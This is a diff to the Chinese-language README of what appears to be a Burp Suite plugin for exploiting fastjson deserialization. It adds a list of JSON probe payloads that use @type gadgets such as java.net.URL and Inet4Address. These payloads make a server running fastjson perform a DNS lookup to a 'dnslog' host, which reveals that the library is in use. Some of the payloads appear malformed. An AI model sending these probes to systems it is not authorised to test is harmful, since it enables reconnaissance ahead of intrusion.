@@ -12,3 +12,12 @@ fastjson利用，burp插件。
 
 # 测试环境
 tomcat启动后，将war包放在webapps目录即（tomcat自带dhcp依赖），漏洞环境为1.2.24和1.2.47。
+
+# 判断是否使用fastjon组件
+dns
+● {"@type":"java.net.Inet4Address","val":"dnslog"}
+● {"@type":"java.net.Inet6Address","val":"dnslog"}
+● {"@type":"java.net.InetSocketAddress"{"address":,"val":"dnslog"}}
+● {{"@type":"java.net.URL","val":"http://dnslog"}:0
+● {"@type":"com.alibaba.fastjson.JSONObject", {"@type": "java.net.URL", "val":"http://dnslog"}}""}
+● Set[{"@type":"java.net.URL","val":"http://dnslog"}]
